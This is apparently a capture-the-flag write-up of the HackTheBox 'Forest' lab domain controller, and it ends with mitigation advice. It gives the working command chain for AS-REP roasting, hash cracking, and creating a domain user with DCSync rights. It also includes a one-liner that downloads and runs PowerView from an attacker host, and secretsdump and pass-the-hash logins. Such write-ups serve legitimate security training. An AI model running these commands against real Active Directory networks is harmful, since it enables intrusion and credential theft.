---
title: "HackTheBox - Forest"
author: Nasrallah
description: ""
date: 2023-07-01 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, as-rep-roasting, dcsync, ldap, crack, hashcat, groups, bloodhound]
img_path: /assets/img/hackthebox/machines/forest
image:
    path: 0.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Forest](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.161
Host is up (0.22s latency).
Not shown: 989 closed tcp ports (reset) 
PORT     STATE SERVICE      VERSION                                            
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-03-12 18:58:20Z)    
135/tcp  open  msrpc        Microsoft Windows RPC           
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h26m49s, deviation: 4h02m31s, median: 6m48s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-03-12T18:58:32
|_  start_date: 2023-03-12T18:54:48
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-03-12T11:58:33-07:00
```

From the open ports the target seems to be a domain controller with the hostname `htb.local`

### Ldap

To enumerate `ldap` we can use `ldapsearch`, and if it allows anonymous connect we can pull some interesting information.

```bash
ldapsearch -H 'ldap://htb.local/' -x -b "dc=htb,dc=local"
```

```terminal
# extended LDIF
#
# LDAPv3
# base <dc=htb,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# htb.local
dn: DC=htb,DC=local
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=htb,DC=local
instanceType: 5
whenCreated: 20190918174549.0Z
whenChanged: 20230902110111.0Z
subRefs: DC=ForestDnsZones,DC=htb,DC=local
subRefs: DC=DomainDnsZones,DC=htb,DC=local
subRefs: CN=Configuration,DC=htb,DC=local
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAOqNrI1l5QUq5WV+CaJoIcQ==
uSNChanged: 888873
name: htb
[...]
```

This gives back a lot of information, the thing we're interested in is usernames.

To retrieve user's information by adding `'(objectClass=person)'`

```bash
ldapsearch -H 'ldap://htb.local/' -x -b "dc=htb,dc=local" '(objectClass=person)'
```

```terminal
# extended LDIF
#
# LDAPv3
# base <dc=htb,dc=local> with scope subtree
# filter: (objectClass=person)
# requesting: ALL
#

# Guest, Users, htb.local
dn: CN=Guest,CN=Users,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=htb,DC=local
uSNChanged: 8197
name: Guest
objectGUID:: 3cHbrmUFAEi25kbTT5W9gA==
userAccountControl: 66082
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
```

To get usernames we can grep for `sAMAccountName`:

```bash
$ cat scans/ldap.out | grep -i "samaccountname"
sAMAccountName: Guest
sAMAccountName: DefaultAccount
sAMAccountName: FOREST$
sAMAccountName: EXCH01$
sAMAccountName: $331000-VK4ADACQNUCA
sAMAccountName: SM_2c8eef0a09b545acb
sAMAccountName: SM_ca8c2ed5bdab4dc9b
sAMAccountName: SM_75a538d3025e4db9a
sAMAccountName: SM_681f53d4942840e18
sAMAccountName: SM_1b41c9286325456bb
sAMAccountName: SM_9b69f1b9d2cc45549
sAMAccountName: SM_7c96b981967141ebb
sAMAccountName: SM_c75ee099d0a64c91b
sAMAccountName: SM_1ffab36a2f5f479cb
sAMAccountName: HealthMailboxc3d7722
sAMAccountName: HealthMailboxfc9daad
sAMAccountName: HealthMailboxc0a90c9
sAMAccountName: HealthMailbox670628e
sAMAccountName: HealthMailbox968e74d
sAMAccountName: HealthMailbox6ded678
sAMAccountName: HealthMailbox83d6781
sAMAccountName: HealthMailboxfd87238
sAMAccountName: HealthMailboxb01ac64
sAMAccountName: HealthMailbox7108a4e
sAMAccountName: HealthMailbox0659cc1
sAMAccountName: sebastien
sAMAccountName: lucinda
sAMAccountName: andy
sAMAccountName: mark
sAMAccountName: santi
```

The ones that look legit are the last 5 ones, so let's get them by adding the following filter to the command:

```bash
tail -n 5 | cut -d " " -f 2
```

```text
sebastien
lucinda
andy
mark
santi
```

Now we can perform an AS-REP Roasting attack using `GetNPUsers.py` from `Impacket-scripts`.

```shell
$ GetNPUsers.py 'htb.local/' -usersfile users.lst -no-pass -dc-ip htb.local
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

It didn't find an account with Pre-Authentication disabled.

Let's try enumerating users using `enum4linux`

```shell
$ enum4linux -U htb.local
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Sep  2 15:00:54 2023

 ========================== 
|    Target Information    |
 ========================== 
Target ........... htb.local
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
    
 ==========================                                                                    
|    Users on htb.local    |
 ========================== 
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

```

It looks like we find another user `svc-alfresco`, let's add it to our list and run `GetNPUsers.py` again.

```shell
$ GetNPUsers.py 'htb.local/' -usersfile users.lst -no-pass -dc-ip htb.local
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:5d2ddc1fe2a1c77d9eb9597a4b64911a$8142786484d4917cc44d1a82ab991ffc217b710001caadf97251d300dd1d34d59d581f73348474ca688138fb6c4fedf6022141cea3ab7f97450990e7c0c12b9e2b88a2af6d047bf823622b017661caf2962ea77ed81b2043d00fe14952cd7e73c3eb50666fc8d0014fee1df2ff9e350423bcfb18702e88bcedbf8a85d17d51ff6e7eae55dbe6e97d888e179c0da4ad756d293291fab0ce249d62dec58b3d4cc73a93959ada906f753ea7bc9357d515aabc58a7bf7d0e5e03b7f92c38ed02895d147af275ffd87eb556eb891004b017c21fdb5756b960e9f3cbc8409517abfe0d860961f0dcc6
```

Great! We got the hash of the account `svc-alfresco`, let's crack using hashcat:

### hashcat

```shell
$ hashcat -m 18200 svc-alfresco.hash /usr/share/wordlists/rockyou.txt      
hashcat (v6.1.1) starting...
                                                                               
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5 CPU       M 520  @ 2.40GHz, 2726/2790 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$svc-alfresco@HTB.LOCAL:5d2ddc1fe2a1c77d9eb9597a4b64911a$8142786484d4917cc44d1a82ab991ffc217b710001caadf97251d300dd1d34d59d581f73348474ca688138fb6c4fedf6022141cea3ab7f97450990e7c0c12b9e2b88a2af6d047bf823622b017661caf2962ea77ed81b2043d00fe14952cd7e73c3eb50666fc8d0014fee1df2ff9e350423bcfb18702e88bcedbf8a85d17d51ff6e7eae55dbe6e97d888e179c0da4ad756d293291fab0ce249d62dec58b3d4cc73a93959ada906f753ea7bc9357d515aabc58a7bf7d0e5e03b7f92c38ed02895d147af275ffd87eb556eb891004b017c21fdb5756b960e9f3cbc8409517abfe0d860961f0dcc6:s3rvice
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:5d2ddc1fe2a1c7...f0dcc6
Time.Started.....: Sat Sep  2 15:05:12 2023 (14 secs)
Time.Estimated...: Sat Sep  2 15:05:26 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   309.2 kH/s (7.33ms) @ Accel:32 Loops:1 Thr:64 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4087808/14344385 (28.50%)
Rejected.........: 0/4087808 (0.00%)
Restore.Point....: 4079616/14344385 (28.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: s9039554h -> s2704081
```

We got the password.

## **Foothold**

Since this is a domain controller, `winrm` is probably open, let's try connecting to it

```shell
$ evil-winrm -i htb.local -u svc-alfresco -p s3rvice

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

Great! We got a shell as `svc-alfresco`


## **Privilege Escalation**

Now we can upload `SharpHound` to collect data for `BloodHound`.

```shell
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> upload /home/sirius/CTF/HTB/Machines/forest/SharpHound.exe
Info: Uploading /home/sirius/CTF/HTB/Machines/forest/SharpHound.exe to C:\Users\svc-alfresco\desktop\SharpHound.exe

                                                             
Data: 1395368 bytes of 1395368 bytes copied

Info: Upload successful!
```

We run the executable, and this results in a zip file.

```shell
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> . .\SharpHound.exe
2023-09-03T02:00:00.4866360-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2023-09-03T02:00:00.5803873-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-09-03T02:00:00.5960121-07:00|INFORMATION|Initializing SharpHound at 2:00 AM on 9/3/2023
2023-09-03T02:00:01.0178846-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for htb.local : FOREST.htb.local
2023-09-03T02:00:01.1430042-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-09-03T02:00:02.1272662-07:00|INFORMATION|Beginning LDAP search for htb.local
2023-09-03T02:00:02.4553857-07:00|INFORMATION|Producer has finished, closing LDAP channel
2023-09-03T02:00:02.4553857-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-09-03T02:00:32.2368916-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 38 MB RAM
2023-09-03T02:00:46.8304822-07:00|INFORMATION|Consumers finished, closing output channel
2023-09-03T02:00:46.8773600-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-09-03T02:00:46.9869099-07:00|INFORMATION|Status: 162 objects finished (+162 3.681818)/s -- Using 46 MB RAM
2023-09-03T02:00:46.9869099-07:00|INFORMATION|Enumeration finished in 00:00:44.8615327
2023-09-03T02:00:47.0961126-07:00|INFORMATION|Saving cache with stats: 119 ID to type mappings.
 118 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-09-03T02:00:47.1117323-07:00|INFORMATION|SharpHound Enumeration Completed at 2:00 AM on 9/3/2023! Happy Graphing!

*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> ls


    Directory: C:\Users\svc-alfresco\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         9/3/2023   2:00 AM          18917 20230903020046_BloodHound.zip
-a----         9/3/2023   2:00 AM          19681 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----         9/3/2023   1:59 AM        1046528 SharpHound.exe
-ar---         9/2/2023   4:01 AM             34 user.txt

```

Let's download the zip file using smb.

First, I setup a SMB server on my machine using the following command:

```bash
sudo impacket-smbserver share ./ -smb2support
```

On the compromised machine i run the following command to download the zip file.

```shell
copy 20230903020046_BloodHound.zip \\attackerIP\share
```

Now we run BloodHound and upload the zip file.

We search for user `svc-alfresco`, go to node info and select `Unrolled Group membership`.

![](1.png)

This show that our user is a member of the `Account Operators` group through a nested Membership:

`svc-alfresco` is member of `Service Accounts` which is member of `Privileged IT Accounts` which is member of `Account Operatos`

Members of the `Account Operators` group can create and modify users and add them to non-protected groups.

Now let's search for `Shortest path to domain admins`

![](2.png)

According to `BloodHound`, the `Account Operators` have `Generic All` privileges over the group `EXCHANGE WINDOWS PERMISSIONS`.
This is also known as full control.

Also. The members of the group `EXCHANGE WINDOWS PERMISSIONS` have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL. With write access to the target object's DACL, you can grant yourself any privilege you want on the object.

Right click on the `Generic all` and select help shows us how to exploit this permission.

![](3.png)

It suggests using `Powerview.ps1` and `net` to exploit this right.

First We add a user to the domain using the following command:

```shell
net user hacker Pass123! /add /domain
```

Now we need add the new user to the `EXCHANGE WINDOWS PERMISSIONS` group so that we can add rights:

```shell
net group "Exchange Windows Permissions" hacker /add
```

We also need to add it to `Remote Management Users` to be able to connect with it.

```shell
net localgroup "Remote Management Users" hacker /add
```

We upload `PowerView.ps1` to the target using the following command which executes the script right away.

```shell
iex(new-object net.webclient).downloadstring("http://10.10.17.90/PowerView.ps1")
```

Now we run the following command to give the new user the `DCSync` right to be able to perform a DCSync attack and get the administrator's hash.

```shell
$pass = convertto-securestring 'Pass123!' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\hacker', $PASS)
Add-ObjectACL -PrincipalIdentity hacker -Credential $cred -Rights DCSync
```

Now on our attacker machine, we use `secretsdump.py` to perform a DCSync .

```shell
$ sudo secretsdump.py 'hacker:Pass123!@htb.local'                                                                                               130 ⨯
[sudo] password for sirius: 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

We got the administrator's hash, now we can use `pass-the-hash` attack to login as `Administrator` using `evil-winrm`

```shell
$ evil-winrm -i htb.local -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

## **Prevention and Mitigation**

### Anonymous connections

Services like `ldap` and `msrpc` are allowing anonymous connection, which gives the an attacker to perform certain activities such us enumerating usernames and other information.

`Anonymous connections` should be disabled.

### AS-REP

The user `svc-alfresco` had the `Pre-Authentication` disabled, which allows him to authenticate without a password and getting a kerberos TGT, this allowd us to retrieve the ticket and crack the password.

`Pre-Authentication` Should always be ON for every account.

`svc-alfresco`'s password was also weak, and that allowed us to crack it very easily. Password should follow a strong password policy to make them difficult to crack.

### Groups

As we saw use `svc-alfresco` was part of a nested groups that we exploited to create a user with DCSync right, then used abused that right and performed a DCSync attack to get administrator's hash.

`Least Privilege Principle` should be applied here, granting users and groups only the minimum level of access and permissions required to perform their task.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).